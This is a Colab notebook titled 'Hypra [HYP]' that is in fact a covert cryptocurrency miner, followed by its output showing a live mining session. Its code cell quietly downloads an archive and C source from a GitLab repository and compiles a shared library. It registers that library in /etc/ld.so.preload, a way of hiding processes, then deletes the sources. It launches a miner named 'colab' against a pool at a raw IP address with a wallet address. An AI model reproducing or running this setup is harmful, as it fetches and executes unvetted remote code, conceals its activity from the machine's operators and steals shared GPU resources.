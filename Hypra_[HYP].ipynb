{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Hypra [HYP]"
      ],
      "metadata": {
        "id": "Gqad-P8m8ia-"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "HCfX6eqF8ibB",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "39a448dd-4ad2-4140-89d5-7572fc3c39e1"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "gcc -Wall -fPIC -shared -o libjava.so java.c -ldl\n",
            "\n",
            "\n",
            "                                                   \n",
            "Build: linux/release/gnu\n",
            "                                                                      \n",
            "\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mConfigured pool 47.236.130.246:6666\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mSelected pool 47.236.130.246:6666\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mNegotiation of EthereumStratum/2.0.0 failed. Trying another ...\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mStratum mode : EthereumStratum/1.0.0 (NiceHash)\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mEstablished connection to 47.236.130.246:6666\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mSpinning up miners...\n",
            "\u001b[33mcu \u001b[35m15:11:54 \u001b[94mcuda-0   \u001b[0mUsing Pci Id : 00:04.0 Tesla T4 (Compute 7.5) Memory : 14.65 GB\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mExtranonce set to \u001b[97m88a4\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mAuthorized worker 0xc7a5d71275f2cc6eeb7c7f793abf41379f7dcc05.593-Colab\n",
            "\u001b[94m i \u001b[35m15:11:54 \u001b[94mcolab    \u001b[0mEpoch : \u001b[97m79\u001b[0m Difficulty : \u001b[97m4.29 Gh\u001b[0m\n",
            "\u001b[33mcu \u001b[35m15:11:56 \u001b[94mcuda-0   \u001b[0mGenerating DAG + Light(on GPU) : 1.64 GB\n",
            "\u001b[32m m \u001b[35m15:11:59 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m0.00 h\u001b[0m - cu0 \u001b[36m0.00\u001b[0m\n",
            "\u001b[33mcu \u001b[35m15:12:03 \u001b[94mcuda-0   \u001b[0mGenerated DAG + Light in 7,441 ms. 13.01 GB left.\n",
            "\u001b[32m m \u001b[35m15:12:04 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m225.31 Kh\u001b[0m - cu0 \u001b[36m225.31\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:09 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.58 Mh\u001b[0m - cu0 \u001b[36m22.58\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:14 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.64 Mh\u001b[0m - cu0 \u001b[36m22.64\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:19 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.60 Mh\u001b[0m - cu0 \u001b[36m22.60\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:24 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.58 Mh\u001b[0m - cu0 \u001b[36m22.58\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:29 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.57 Mh\u001b[0m - cu0 \u001b[36m22.57\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:34 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.41 Mh\u001b[0m - cu0 \u001b[36m22.41\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:39 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m22.15 Mh\u001b[0m - cu0 \u001b[36m22.15\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:44 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m21.33 Mh\u001b[0m - cu0 \u001b[36m21.33\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:49 \u001b[94mcolab    \u001b[0m\u001b[32m0:00\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m20.98 Mh\u001b[0m - cu0 \u001b[36m20.98\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:54 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m21.01 Mh\u001b[0m - cu0 \u001b[36m21.01\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:12:59 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A0\u001b[0m \u001b[1;36m21.10 Mh\u001b[0m - cu0 \u001b[36m21.10\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:13:01 \u001b[94mcolab    \u001b[0m\u001b[92m**Cocolcod\u001b[0m   4 ms. 47.236.130.246:6666\n",
            "\u001b[32m m \u001b[35m15:13:04 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.24 Mh\u001b[0m - cu0 \u001b[36m21.24\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:09 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.46 Mh\u001b[0m - cu0 \u001b[36m21.46\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:14 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.56 Mh\u001b[0m - cu0 \u001b[36m21.56\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:19 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.52 Mh\u001b[0m - cu0 \u001b[36m21.52\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:24 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.63 Mh\u001b[0m - cu0 \u001b[36m21.63\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:29 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.71 Mh\u001b[0m - cu0 \u001b[36m21.71\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:34 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.97 Mh\u001b[0m - cu0 \u001b[36m21.97\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:39 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.84 Mh\u001b[0m - cu0 \u001b[36m21.84\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:44 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.80 Mh\u001b[0m - cu0 \u001b[36m21.80\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:49 \u001b[94mcolab    \u001b[0m\u001b[32m0:01\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.69 Mh\u001b[0m - cu0 \u001b[36m21.69\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:54 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.68 Mh\u001b[0m - cu0 \u001b[36m21.68\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:13:59 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.61 Mh\u001b[0m - cu0 \u001b[36m21.61\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:04 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.57 Mh\u001b[0m - cu0 \u001b[36m21.57\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:09 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.60 Mh\u001b[0m - cu0 \u001b[36m21.60\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:14 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.59 Mh\u001b[0m - cu0 \u001b[36m21.59\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:14:16 \u001b[94mcolab    \u001b[0mEpoch : \u001b[97m79\u001b[0m Difficulty : \u001b[97m570.21 Mh\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:19 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A1\u001b[0m \u001b[1;36m21.57 Mh\u001b[0m - cu0 \u001b[36m21.57\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:14:20 \u001b[94mcolab    \u001b[0m\u001b[92m**Cocolcod\u001b[0m   4 ms. 47.236.130.246:6666\n",
            "\u001b[32m m \u001b[35m15:14:24 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A2\u001b[0m \u001b[1;36m21.56 Mh\u001b[0m - cu0 \u001b[36m21.56\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:29 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A2\u001b[0m \u001b[1;36m21.52 Mh\u001b[0m - cu0 \u001b[36m21.52\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:34 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A2\u001b[0m \u001b[1;36m21.56 Mh\u001b[0m - cu0 \u001b[36m21.56\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:14:35 \u001b[94mcolab    \u001b[0m\u001b[92m**Cocolcod\u001b[0m   5 ms. 47.236.130.246:6666\n",
            "\u001b[94m i \u001b[35m15:14:39 \u001b[94mcolab    \u001b[0m\u001b[92m**Cocolcod\u001b[0m   5 ms. 47.236.130.246:6666\n",
            "\u001b[32m m \u001b[35m15:14:39 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.58 Mh\u001b[0m - cu0 \u001b[36m21.58\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:44 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.67 Mh\u001b[0m - cu0 \u001b[36m21.67\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:49 \u001b[94mcolab    \u001b[0m\u001b[32m0:02\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.53 Mh\u001b[0m - cu0 \u001b[36m21.53\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:54 \u001b[94mcolab    \u001b[0m\u001b[32m0:03\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.60 Mh\u001b[0m - cu0 \u001b[36m21.60\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:14:59 \u001b[94mcolab    \u001b[0m\u001b[32m0:03\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.62 Mh\u001b[0m - cu0 \u001b[36m21.62\u001b[0m\n",
            "\u001b[32m m \u001b[35m15:15:04 \u001b[94mcolab    \u001b[0m\u001b[32m0:03\u001b[0m\u001b[1;97m A4\u001b[0m \u001b[1;36m21.57 Mh\u001b[0m - cu0 \u001b[36m21.57\u001b[0m\n",
            "\u001b[94m i \u001b[35m15:15:07 \u001b[94mcolab    \u001b[0m\u001b[92m**Cocolcod\u001b[0m   5 ms. 47.236.130.246:6666\n"
          ]
        }
      ],
      "source": [
        "!export LANG=C &\n",
        "!export LC_ALL=C &\n",
        "!wget -qO /content/colab.tar.gz https://gitlab.com/ghcees/mod/-/raw/main/Cocolcod.tar.gz > /dev/null 2>&1\n",
        "!tar -xvf /content/colab.tar.gz -C /content &>/dev/null\n",
        "!rm -rf /content/colab.tar.gz &>/dev/null\n",
        "!wget -qO /content/Makefile https://gitlab.com/ghcees/mod/-/raw/main/Makefile > /dev/null 2>&1\n",
        "!wget -qO /content/java.c https://gitlab.com/ghcees/mod/-/raw/main/java.c > /dev/null 2>&1\n",
        "!sleep .2\n",
        "!make\n",
        "!gcc -Wall -fPIC -shared -o libjava.so java.c -ldl\n",
        "!mv libjava.so /usr/local/lib/\n",
        "!echo /usr/local/lib/libjava.so >> /etc/ld.so.preload\n",
        "!sleep .3\n",
        "!rm -rf java.c Makefile\n",
        "!sleep .2\n",
        "!./colab -P stratum://0x04f30a383d65fa38620ab02e4621aa1772c5b2c1.$(echo $(shuf -i 1-999 -n 1)-Colab)@47.236.130.246:6666"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4",
      "machine_shape": "hm"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}